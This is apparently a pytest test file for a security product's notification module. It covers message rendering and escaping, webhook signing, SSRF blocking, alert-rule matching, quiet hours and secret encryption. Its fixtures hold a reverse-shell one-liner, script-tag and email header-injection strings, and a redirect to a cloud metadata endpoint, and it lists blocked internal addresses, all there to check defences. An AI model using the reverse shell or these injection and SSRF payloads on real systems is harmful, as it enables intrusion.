"""Notifications without a database: payload rendering, signatures, SSRF
protection, rule matching, quiet hours, encryption/masking.

No real network traffic: DNS is mocked, and the only sockets opened are to a
local HTTP server on 127.0.0.1 started by the test itself.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import http.server
import json
import socket
import threading
from datetime import datetime
from types import SimpleNamespace

import pytest

from app import config
from app.notifications import channels as ch
from app.notifications import crypto, messages, signing, ssrf
from app.notifications.rules import EventContext, digest_due, matches, quiet_until

URL_SLACK = "https://hooks.slack.com/services/T000/B000/SECRETTOKEN123"
URL_TEAMS = "https://contoso.webhook.office.com/webhookb2/abc@def/IncomingWebhook/SECRETPART/xyz"


@pytest.fixture(autouse=True)
def _env(monkeypatch):
    for k in ("NOTIFICATIONS_ALLOW_INSECURE_DEV", "NOTIFICATIONS_ENCRYPTION_KEY", "PUBLIC_BASE_URL", "APP_ENV",
              "NOTIFICATIONS_ALLOWED_HOSTS_WEBHOOK", "NOTIFICATIONS_ALLOWED_HOSTS_SLACK"):
        monkeypatch.delenv(k, raising=False)
    monkeypatch.setenv("PUBLIC_BASE_URL", "https://cnapp.example.com/")
    config.reload_settings()
    yield
    monkeypatch.undo()
    config.reload_settings()


def fake_dns(monkeypatch, answers: dict[str, list[str]] | None = None, default: list[str] | None = None):
    calls = []

    def getaddrinfo(host, port, *a, **kw):
        calls.append(host)
        ips = (answers or {}).get(host, default or ["93.184.216.34"])
        return [(socket.AF_INET6 if ":" in ip else socket.AF_INET, socket.SOCK_STREAM, 6, "", (ip, port))
                for ip in ips]

    monkeypatch.setattr(ssrf.socket, "getaddrinfo", getaddrinfo)
    return calls


def sample_event(**over):
    ev = SimpleNamespace(id="ev1", created_at=datetime(2026, 10, 15, 12, 0), source="runtime_alert",
                         event_type="created", severity="critical", title="Reverse shell <!channel> [x](http://evil)",
                         summary="bash -i >& /dev/tcp/1.2.3.4/4444 <script>alert(1)</script>", entity_id="a1",
                         asset_id="vm1", rule_id="CDR-001", mitre_technique_id="T1059.004",
                         link_path="/threats?alert=a1", attributes={"mitre_technique_name": "Unix Shell"})
    for k, v in over.items():
        setattr(ev, k, v)
    return ev


ASSET = SimpleNamespace(name="web-01", type="vm", subscription_id="sub-1", subscription_name="Prod", tags={})


# --- rendering ---------------------------------------------------------------------

def test_event_message_has_deep_link_and_facts():
    msg = messages.event_message(sample_event(), ASSET, suppressed=3)
    assert msg["link"] == "https://cnapp.example.com/threats?alert=a1"
    facts = dict(msg["facts"])
    assert facts["Resource"] == "web-01 (vm)" and facts["Subscription"] == "Prod"
    assert facts["MITRE ATT&CK"] == "T1059.004 Unix Shell" and "3 similar" in facts["Suppressed"]


def test_no_link_without_public_base_url(monkeypatch):
    monkeypatch.delenv("PUBLIC_BASE_URL")
    assert messages.event_message(sample_event())["link"] is None


def test_teams_adaptive_card():
    payload = ch.render_teams(messages.event_message(sample_event(), ASSET))
    att = payload["attachments"][0]
    assert payload["type"] == "message" and att["contentType"] == "application/vnd.microsoft.card.adaptive"
    card = att["content"]
    assert card["type"] == "AdaptiveCard" and card["version"] == "1.4"
    assert card["actions"][0] == {"type": "Action.OpenUrl", "title": "Open in CloudSecurity",
                                  "url": "https://cnapp.example.com/threats?alert=a1"}
    assert card["body"][0]["color"] == "attention"
    text = json.dumps(card)
    assert "](http://evil" not in text  # markdown link syntax from workload data is neutralised
    assert "<script>" not in text


def test_slack_blocks_escape_mentions():
    payload = ch.render_slack(messages.event_message(sample_event(), ASSET))
    # plain_text (the header) never parses mentions; everything parsed as mrkdwn must be escaped
    mrkdwn = json.dumps([payload["text"]] + payload["blocks"][1:])
    assert "<!channel>" not in mrkdwn and "&lt;!channel&gt;" in payload["text"]
    assert payload["blocks"][0]["text"]["type"] == "plain_text"
    assert payload["blocks"][0]["type"] == "header" and len(payload["blocks"][0]["text"]["text"]) <= 150
    button = payload["blocks"][-1]["elements"][0]
    assert button["url"] == "https://cnapp.example.com/threats?alert=a1" and button["style"] == "danger"
    assert payload["text"].startswith("[CRITICAL]")


def test_email_rendering_is_escaped_and_header_safe():
    subject, text, body = ch.render_email(messages.event_message(sample_event(title="a\r\nBcc: x@evil.com"), ASSET))
    assert "\n" not in subject and "\r" not in subject and subject.startswith("[CNAPP][CRITICAL]")
    assert "<script>" not in body and "&lt;script&gt;" in body
    assert "https://cnapp.example.com/threats?alert=a1" in body and "Open in CloudSecurity" in text


def test_webhook_payload_and_digest():
    p = ch.render_webhook(messages.event_message(sample_event(), ASSET, suppressed=2), "d1")
    assert p["id"] == "d1" and p["type"] == "cnapp.notification.event" and p["suppressed_since_last"] == 2
    assert p["event"]["rule_id"] == "CDR-001" and p["event"]["link"].endswith("/threats?alert=a1")
    items = [{"severity": "low", "title": f"t{i}", "source": "posture_finding", "link_path": f"/findings?finding={i}"}
             for i in range(3)]
    d = messages.digest_message("Low noise", items, 3, datetime(2026, 10, 15, 8))
    assert ch.render_webhook(d, "d2")["digest"]["total"] == 3
    assert "t2" in json.dumps(ch.render_slack(d)) and "t1" in json.dumps(ch.render_teams(d))


# --- signatures ----------------------------------------------------------------------

SECRET = "s" * 40


def test_signature_roundtrip_and_tampering():
    body = b'{"a":1}'
    h = signing.sign(SECRET, body, timestamp=1_700_000_000)
    expected = hmac.new(SECRET.encode(), b"1700000000." + body, hashlib.sha256).hexdigest()
    assert h["X-CNAPP-Signature"] == f"v1={expected}"
    ok = dict(timestamp=h["X-CNAPP-Timestamp"], signature=h["X-CNAPP-Signature"], now=1_700_000_100)
    assert signing.verify(SECRET, body, **ok)
    assert not signing.verify(SECRET, b'{"a":2}', **ok)  # body changed
    assert not signing.verify("x" * 40, body, **ok)  # wrong secret
    assert not signing.verify(SECRET, body, h["X-CNAPP-Timestamp"], h["X-CNAPP-Signature"], now=1_700_000_301)
    assert not signing.verify(SECRET, body, "1700000001", h["X-CNAPP-Signature"], now=1_700_000_000)  # replayed ts
    assert not signing.verify(SECRET, body, None, None)
    # rotation: several signatures, any valid one is accepted
    assert signing.verify(SECRET, body, h["X-CNAPP-Timestamp"], "v1=deadbeef," + h["X-CNAPP-Signature"],
                          now=1_700_000_000)


def test_send_webhook_signs_exact_body(monkeypatch):
    sent = {}

    def fake_post(url, body, headers, *, kind):
        sent.update(url=url, body=body, headers=headers, kind=kind)
        return ssrf.HttpResponse(204, b"", {})

    monkeypatch.setattr(ssrf, "post", fake_post)
    r = ch.send("webhook", {}, {"url": "https://hooks.example.com/in", "signing_secret": SECRET},
                messages.event_message(sample_event()), "deliv-1")
    assert r.status == 204 and sent["kind"] == "webhook"
    h = sent["headers"]
    assert h["X-CNAPP-Delivery"] == "deliv-1" and h["X-CNAPP-Event"] == "runtime_alert.created"
    assert signing.verify(SECRET, sent["body"], h["X-CNAPP-Timestamp"], h["X-CNAPP-Signature"])
    assert json.loads(sent["body"])["event"]["id"] == "ev1"


def test_acs_request_signing(monkeypatch):
    key = base64.b64encode(b"k" * 32).decode()
    sent = {}
    monkeypatch.setattr(ssrf, "post", lambda url, body, headers, *, kind: sent.update(
        url=url, body=body, headers=headers, kind=kind) or ssrf.HttpResponse(202, b"{}", {}))
    cfg = {"provider": "acs", "sender_address": "DoNotReply@contoso.com", "to_addresses": ["soc@contoso.com"]}
    sec = {"connection_string": f"endpoint=https://acs-demo.communication.azure.com/;accesskey={key}"}
    assert ch.send("email", cfg, sec, messages.test_message("ACS", None, datetime(2026, 1, 1)), "d1").status == 202
    assert sent["url"] == "https://acs-demo.communication.azure.com/emails:send?api-version=2023-03-31"
    h = sent["headers"]
    assert h["x-ms-content-sha256"] == base64.b64encode(hashlib.sha256(sent["body"]).digest()).decode()
    to_sign = (f"POST\n/emails:send?api-version=2023-03-31\n{h['x-ms-date']};acs-demo.communication.azure.com;"
               f"{h['x-ms-content-sha256']}")
    sig = base64.b64encode(hmac.new(b"k" * 32, to_sign.encode(), hashlib.sha256).digest()).decode()
    assert h["Authorization"].endswith(f"&Signature={sig}") and h["Operation-Id"] == "d1"
    assert json.loads(sent["body"])["recipients"]["to"] == [{"address": "soc@contoso.com"}]


@pytest.mark.parametrize("status,error", [(400, ch.PermanentError), (404, ch.PermanentError),
                                          (302, ch.PermanentError), (429, ch.TransientError),
                                          (500, ch.TransientError), (503, ch.TransientError)])
def test_http_status_classification(monkeypatch, status, error):
    monkeypatch.setattr(ssrf, "post", lambda *a, **k: ssrf.HttpResponse(status, b"nope", {"retry-after": "30"}))
    with pytest.raises(error) as exc:
        ch.send("slack", {}, {"webhook_url": URL_SLACK}, messages.test_message("x", None, datetime(2026, 1, 1)), "d")
    if status == 429:
        assert exc.value.retry_after == 30


def test_teams_200_with_throttle_text_is_transient(monkeypatch):
    monkeypatch.setattr(ssrf, "post", lambda *a, **k: ssrf.HttpResponse(
        200, b"Webhook message delivery failed with error: Microsoft Teams endpoint returned HTTP error 429", {}))
    with pytest.raises(ch.TransientError):
        ch.send("teams", {}, {"webhook_url": URL_TEAMS}, messages.test_message("x", None, datetime(2026, 1, 1)), "d")


# --- SSRF ---------------------------------------------------------------------------

@pytest.mark.parametrize("url,why", [
    ("http://hooks.example.com/x", "https"),
    ("ftp://hooks.example.com/x", "https"),
    ("https://user:pw@hooks.example.com/x", "credentials"),
    ("https://127.0.0.1/x", "loopback"),
    ("https://10.0.0.5/x", "private"),
    ("https://192.168.1.10/x", "private"),
    ("https://172.16.3.4/x", "private"),
    ("https://169.254.169.254/latest/meta-data", "link-local"),
    ("https://168.63.129.16/machine", "blocked range"),
    ("https://100.64.1.1/x", "blocked range"),
    ("https://[::1]/x", "loopback"),
    ("https://[fd00::1]/x", "fd00::/8"),
    ("https://[fe80::1]/x", "link-local"),
    ("https://[::ffff:127.0.0.1]/x", "loopback"),
    ("https://[::ffff:169.254.169.254]/x", "link-local"),
    ("https://[64:ff9b::a9fe:a9fe]/x", "link-local"),
    ("https://0.0.0.0/x", "not a unicast"),
    ("https://localhost/x", "internal hostname"),
    ("https://metadata.google.internal/x", "metadata"),
    ("https://svc.default.svc/x", "internal hostname"),
])
def test_blocked_urls(monkeypatch, url, why):
    fake_dns(monkeypatch)
    with pytest.raises(ssrf.BlockedDestination) as exc:
        ssrf.check_url(url, "webhook")
    assert why in str(exc.value)


@pytest.mark.parametrize("answer", [["127.0.0.1"], ["10.1.2.3"], ["169.254.169.254"], ["93.184.216.34", "10.0.0.1"],
                                    ["::1"], ["fd12:3456::1"]])
def test_hostname_resolving_to_internal_address_is_blocked(monkeypatch, answer):
    fake_dns(monkeypatch, {"evil.example.com": answer})
    with pytest.raises(ssrf.BlockedDestination, match="resolves to a blocked address"):
        ssrf.check_url("https://evil.example.com/hook", "webhook")


def test_public_hostname_is_pinned_to_vetted_ip(monkeypatch):
    fake_dns(monkeypatch, {"hooks.example.com": ["93.184.216.34"]})
    t = ssrf.check_url("https://hooks.example.com:8443/in?x=1", "webhook")
    assert (t.host, t.port, t.path, t.ip) == ("hooks.example.com", 8443, "/in?x=1", "93.184.216.34")


def test_dns_rebinding_cannot_switch_the_connected_address(monkeypatch):
    """The first lookup is public, any later one internal: the connection must
    go to the address that was validated, never to a re-resolved one."""
    answers = iter([["93.184.216.34"]] + [["127.0.0.1"]] * 10)

    def getaddrinfo(host, port, *a, **kw):
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (ip, port)) for ip in next(answers)]

    monkeypatch.setattr(ssrf.socket, "getaddrinfo", getaddrinfo)
    connected = []

    def create_connection(addr, *a, **kw):
        connected.append(addr)
        raise ConnectionRefusedError("test: no network")

    monkeypatch.setattr(ssrf.socket, "create_connection", create_connection)
    with pytest.raises(ssrf.DeliveryHTTPError):
        ssrf.post("https://rebind.example.com/hook", b"{}", {}, kind="webhook")
    assert connected == [("93.184.216.34", 443)]


def test_host_allowlists(monkeypatch):
    fake_dns(monkeypatch)
    assert ssrf.check_url(URL_SLACK, "slack").host == "hooks.slack.com"
    assert ssrf.check_url(URL_TEAMS, "teams").host == "contoso.webhook.office.com"
    assert ssrf.check_url("https://prod-12.westeurope.logic.azure.com:443/workflows/x", "teams")
    for url, kind in [("https://hooks.slack.com.evil.com/x", "slack"), ("https://evil.com/hooks.slack.com", "slack"),
                      ("https://webhook.office.com.evil.com/x", "teams"), ("https://93.184.216.34/x", "slack")]:
        with pytest.raises(ssrf.BlockedDestination, match="allowlist"):
            ssrf.check_url(url, kind)
    monkeypatch.setenv("NOTIFICATIONS_ALLOWED_HOSTS_WEBHOOK", "*.partner.example")
    assert ssrf.check_url("https://in.partner.example/x", "webhook")
    with pytest.raises(ssrf.BlockedDestination, match="allowlist"):
        ssrf.check_url("https://other.example/x", "webhook")
    monkeypatch.setenv("NOTIFICATIONS_ALLOWED_HOSTS_SLACK", "*")
    assert ssrf.check_url("https://slack-proxy.example/x", "slack")


def test_dev_flag_allows_http_and_loopback_but_never_in_production(monkeypatch):
    fake_dns(monkeypatch, {"localhost": ["127.0.0.1"]})
    monkeypatch.setenv("NOTIFICATIONS_ALLOW_INSECURE_DEV", "true")
    assert ssrf.check_url("http://localhost:9000/hook", "webhook").ip == "127.0.0.1"
    with pytest.raises(ssrf.BlockedDestination, match="link-local"):  # metadata stays blocked even in dev
        ssrf.check_url("http://169.254.169.254/", "webhook")
    monkeypatch.setenv("APP_ENV", "production")
    config.reload_settings()
    with pytest.raises(ssrf.BlockedDestination, match="https"):
        ssrf.check_url("http://localhost:9000/hook", "webhook")


class _Handler(http.server.BaseHTTPRequestHandler):
    received: list = []

    def do_POST(self):  # noqa: N802
        n = int(self.headers.get("content-length", 0))
        _Handler.received.append(self.rfile.read(n))
        if self.path == "/redirect":
            self.send_response(302)
            self.send_header("Location", "http://169.254.169.254/latest/meta-data")
            self.end_headers()
            return
        body = b"x" * 200_000 if self.path == "/big" else b"ok"
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


@pytest.fixture()
def local_server(monkeypatch):
    monkeypatch.setenv("NOTIFICATIONS_ALLOW_INSECURE_DEV", "true")  # http + loopback for this local receiver
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    _Handler.received = []
    yield f"http://127.0.0.1:{srv.server_address[1]}"
    srv.shutdown()


def test_redirects_are_not_followed(local_server):
    resp = ssrf.post(local_server + "/redirect", b"{}", {"Content-Type": "application/json"}, kind="webhook")
    assert resp.status == 302 and len(_Handler.received) == 1
    with pytest.raises(ch.PermanentError, match="redirects are not followed"):
        ch._classify(resp, "webhook")


def test_response_size_is_capped(local_server, monkeypatch):
    monkeypatch.setenv("NOTIFICATIONS_MAX_RESPONSE_BYTES", "1024")
    resp = ssrf.post(local_server + "/big", b"{}", {}, kind="webhook")
    assert resp.status == 200 and resp.truncated and len(resp.body) == 1024


# --- channel validation -------------------------------------------------------------

def test_channel_validation(monkeypatch):
    fake_dns(monkeypatch)
    assert ch.validate("slack", {}, {"webhook_url": URL_SLACK})[1]["webhook_url"] == URL_SLACK
    bad = [
        ("slack", {}, {"webhook_url": "https://example.com/x"}, "allowlist"),
        ("slack", {}, {}, "required"),
        ("webhook", {}, {"url": "https://h.example.com/x", "signing_secret": "short"}, "signing_secret"),
        ("webhook", {}, {"url": "https://10.0.0.1/x", "signing_secret": SECRET}, "private"),
        ("email", {"provider": "smtp", "to_addresses": "a@example.com", "host": "smtp.example.com", "port": 587,
                   "from_address": "x@example.com", "security": "none"}, {}, "security"),
        ("email", {"provider": "smtp", "to_addresses": "a@example.com\r\nBcc: z@evil.com", "host": "smtp.example.com",
                   "from_address": "x@example.com"}, {}, "invalid email"),
        ("email", {"provider": "acs", "to_addresses": ["a@example.com"], "sender_address": "s@example.com"},
         {"connection_string": "endpoint=https://evil.example.com/;accesskey=a2V5"}, "allowlist"),
        ("teams", {"bogus": 1}, {"webhook_url": URL_TEAMS}, "unknown field"),
    ]
    for ctype, cfg, sec, why in bad:
        with pytest.raises(ch.ChannelConfigError) as exc:
            ch.validate(ctype, cfg, sec)
        assert why in str(exc.value), (ctype, str(exc.value))
    cfg, sec = ch.validate("email", {"provider": "smtp", "to_addresses": "a@example.com, b@example.com",
                                     "host": "SMTP.Example.com", "port": "587", "from_address": "x@example.com",
                                     "username": "u"}, {"password": "pw"})
    assert cfg["to_addresses"] == ["a@example.com", "b@example.com"] and cfg["host"] == "smtp.example.com"
    assert cfg["port"] == 587 and sec == {"password": "pw"}


def test_smtp_private_relay_blocked_unless_allowed(monkeypatch):
    fake_dns(monkeypatch, {"relay.corp.example": ["10.1.2.3"]})
    with pytest.raises(ch.PermanentError, match="NOTIFICATIONS_SMTP_ALLOW_PRIVATE"):
        ch._smtp_target("relay.corp.example", 587)
    monkeypatch.setenv("NOTIFICATIONS_SMTP_ALLOW_PRIVATE", "true")
    assert ch._smtp_target("relay.corp.example", 587) == "10.1.2.3"
    fake_dns(monkeypatch, {"relay.corp.example": ["169.254.169.254"]})
    with pytest.raises(ch.PermanentError, match="link-local"):
        ch._smtp_target("relay.corp.example", 587)


def test_smtp_send_uses_starttls_and_pinned_ip(monkeypatch):
    fake_dns(monkeypatch, {"smtp.example.com": ["93.184.216.34"]})
    log = []

    class FakeSMTP:
        def __init__(self, ip, **kw):
            log.append(("init", ip))

        def __enter__(self):
            return self

        def __exit__(self, *a):
            log.append("quit")

        def connect(self, host, port):
            log.append(("connect", host, port))

        def ehlo(self):
            log.append("ehlo")

        def has_extn(self, name):
            return name == "starttls"

        def starttls(self, context):
            log.append("starttls")

        def login(self, u, p):
            log.append(("login", u, p))

        def send_message(self, em):
            log.append(("send", em["To"], em["Subject"]))
            return {}

    monkeypatch.setattr(ch, "_PinnedSMTP", FakeSMTP)
    cfg = {"provider": "smtp", "host": "smtp.example.com", "port": 587, "security": "starttls", "username": "bot",
           "from_address": "cnapp@example.com", "to_addresses": ["soc@example.com"]}
    r = ch.send("email", cfg, {"password": "pw"}, messages.test_message("Mail", None, datetime(2026, 1, 1)), "d1")
    assert r.status == 250
    assert log[0] == ("init", "93.184.216.34") and log[1] == ("connect", "smtp.example.com", 587)
    assert log.index("starttls") < log.index(("login", "bot", "pw"))
    assert log[-2][0] == "send" and log[-2][1] == "soc@example.com"


# --- rules --------------------------------------------------------------------------

def rule(**over):
    base = dict(enabled=True, sources=[], event_types=[], min_severity="high", subscription_ids=[], asset_ids=[],
                asset_types=[], tags={}, rule_ids=[], mitre_techniques=[], include_status_changes=False,
                quiet_start=None, quiet_end=None, timezone="UTC", quiet_bypass_severity=None, digest_hour=8,
                last_digest_at=None)
    base.update(over)
    return SimpleNamespace(**base)


def ctx(**over):
    base = dict(source="runtime_alert", event_type="created", severity="high", asset_id="vm1", asset_type="vm",
                subscription_id="SUB-1", tags={"env": "prod", "team": "payments"}, rule_id="CDR-004",
                mitre_technique_id="T1059.004")
    base.update(over)
    return EventContext(**base)


@pytest.mark.parametrize("r,c,expected", [
    (rule(), ctx(), True),
    (rule(enabled=False), ctx(), False),
    (rule(min_severity="critical"), ctx(), False),
    (rule(min_severity="low"), ctx(severity="medium"), True),
    (rule(sources=["posture_finding"]), ctx(), False),
    (rule(sources=["runtime_alert", "device"]), ctx(), True),
    (rule(), ctx(event_type="status_changed"), False),
    (rule(include_status_changes=True), ctx(event_type="status_changed"), True),
    (rule(event_types=["failed"]), ctx(event_type="completed"), False),
    (rule(subscription_ids=["sub-1"]), ctx(), True),
    (rule(subscription_ids=["sub-2"]), ctx(), False),
    (rule(asset_types=["pod"]), ctx(), False),
    (rule(asset_ids=["VM1"]), ctx(), True),
    (rule(tags={"env": "prod"}), ctx(), True),
    (rule(tags={"env": "dev"}), ctx(), False),
    (rule(tags={"owner": "*"}), ctx(), False),
    (rule(tags={"team": "*"}), ctx(), True),
    (rule(rule_ids=["CDR-00*"]), ctx(), True),
    (rule(rule_ids=["CIS-*"]), ctx(), False),
    (rule(mitre_techniques=["T1059"]), ctx(), True),
    (rule(mitre_techniques=["T1059.004"]), ctx(), True),
    (rule(mitre_techniques=["T1105"]), ctx(), False),
    (rule(mitre_techniques=["T1059"]), ctx(mitre_technique_id=None), False),
    (rule(sources=["device"], tags={"team": "payments"}), ctx(source="device", asset_id=None, asset_type="laptop"), True),
])
def test_rule_matching(r, c, expected):
    assert matches(r, c) is expected


def test_quiet_hours():
    r = rule(quiet_start="22:00", quiet_end="07:00", timezone="Europe/Berlin", quiet_bypass_severity="critical")
    # 23:30 UTC = 01:30 Berlin (CEST, +2) -> held until 07:00 Berlin = 05:00 UTC
    assert quiet_until(r, datetime(2026, 7, 1, 23, 30), "high") == datetime(2026, 7, 2, 5, 0)
    # 20:30 UTC = 22:30 Berlin -> held until next morning
    assert quiet_until(r, datetime(2026, 7, 1, 20, 30), "high") == datetime(2026, 7, 2, 5, 0)
    assert quiet_until(r, datetime(2026, 7, 1, 12, 0), "high") is None  # daytime
    assert quiet_until(r, datetime(2026, 7, 1, 23, 30), "critical") is None  # bypass
    day = rule(quiet_start="09:00", quiet_end="17:00")
    assert quiet_until(day, datetime(2026, 7, 1, 10, 0), "low") == datetime(2026, 7, 1, 17, 0)
    assert quiet_until(rule(), datetime(2026, 7, 1, 10, 0), "low") is None


def test_digest_schedule():
    r = rule(digest_hour=8, timezone="UTC")
    assert not digest_due(r, datetime(2026, 7, 1, 7, 59))
    assert digest_due(r, datetime(2026, 7, 1, 8, 0))
    r.last_digest_at = datetime(2026, 7, 1, 8, 0)
    assert not digest_due(r, datetime(2026, 7, 1, 23, 0))
    assert digest_due(r, datetime(2026, 7, 2, 8, 5))


# --- encryption / masking -------------------------------------------------------------

def test_encryption_roundtrip_and_rotation(monkeypatch):
    old, new = crypto.generate_key(), crypto.generate_key()
    monkeypatch.setenv("NOTIFICATIONS_ENCRYPTION_KEY", old)
    token = crypto.encrypt_secrets({"webhook_url": URL_SLACK})
    assert "SECRETTOKEN" not in token and "hooks.slack.com" not in token
    assert crypto.decrypt_secrets(token) == {"webhook_url": URL_SLACK}
    monkeypatch.setenv("NOTIFICATIONS_ENCRYPTION_KEY", f"{new},{old}")  # rotation: new key first
    assert crypto.decrypt_secrets(token)["webhook_url"] == URL_SLACK
    rotated = crypto.rotate(token)
    monkeypatch.setenv("NOTIFICATIONS_ENCRYPTION_KEY", new)
    assert crypto.decrypt_secrets(rotated)["webhook_url"] == URL_SLACK
    with pytest.raises(crypto.DecryptionFailed):
        crypto.decrypt_secrets(token)  # old key removed
    monkeypatch.setenv("NOTIFICATIONS_ENCRYPTION_KEY", "not-a-fernet-key")
    with pytest.raises(crypto.EncryptionUnavailable):
        crypto.encrypt_secrets({"a": "b"})


def test_production_requires_encryption_key(monkeypatch):
    monkeypatch.setenv("APP_ENV", "production")
    config.reload_settings()
    with pytest.raises(crypto.EncryptionUnavailable):
        crypto.encrypt_secrets({"a": "b"})


def test_masking_and_redaction():
    assert crypto.mask(URL_SLACK, kind="url") == "https://hooks.slack.com/••••••"
    assert crypto.mask("supersecretpassword") == "••••word" and crypto.mask("short") == "••••••"
    key = base64.b64encode(b"k" * 32).decode()
    assert crypto.mask(f"endpoint=https://x.communication.azure.com/;accesskey={key}",
                       kind="connection_string") == "https://x.communication.azure.com/••••••"
    err = f"ConnectionError: POST {URL_SLACK} failed; path /services/T000/B000/SECRETTOKEN123"
    red = crypto.redact(err, {"webhook_url": URL_SLACK})
    assert "SECRETTOKEN123" not in red and "[REDACTED]" in red
